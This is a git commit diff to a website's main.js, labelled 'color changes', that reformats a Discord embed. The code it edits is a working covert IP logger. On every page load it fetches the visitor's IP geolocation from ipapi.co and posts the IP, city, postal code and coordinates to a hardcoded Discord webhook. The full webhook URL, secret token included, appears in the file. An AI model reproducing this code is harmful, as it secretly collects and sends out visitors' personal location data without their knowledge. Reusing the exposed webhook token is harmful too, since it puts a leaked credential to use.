e183160a67498d138f504c7533b0a59e69cb3fe0
Anthony Huang <anthonyhuang07@icloud.com>
2022-07-05 18:19:20 -0400

    color changes

--- main.js
+++ main.js
@@ -2,8 +2,14 @@ window.addEventListener('load', (event) => {
     $.getJSON('https://ipapi.co/json/', (data) => {
         let content = {
             title: "Someone visited a page on our website!",
-            description: "IP: ${data.ip}\nCountry: ${data.country_name}\nState/Province: ${data.region}\nTown/City: ${data.city}\nZip/Postal: ${data.postal}\nCoordinates: ${data.latitude}, ${data.longitude}",
-            color: hexToDecimal("#ff0000")
+            description: `
+            **IP:** ${data.ip}\n
+            **Country:** ${data.country_name}\n
+            **State/Province:** ${data.region}\n
+            **Town/City:** ${data.city}\n
+            **Zip/Postal:** ${data.postal}\n
+            **Coordinates:** ${data.latitude}, ${data.longitude}`,
+            color: "RANDOM"
         }
 
         data = {
@@ -15,9 +21,5 @@ window.addEventListener('load', (event) => {
         HTTP.open("POST", "https://discord.com/api/webhooks/993973447040434360/c9KNCteozfPTUXXFZe42-qIg9Ik5eQNPlcZnA1-ynI6MvDOIKv7pK4mLaoSTvgRpZ3jK", true)
         HTTP.setRequestHeader("Content-Type", "application/json")
         HTTP.send(JSON.stringify(data))
-
-        function hexToDecimal(hex) {
-            return parseInt(hex.replace("#",""), 16)
-        }
     });
 });
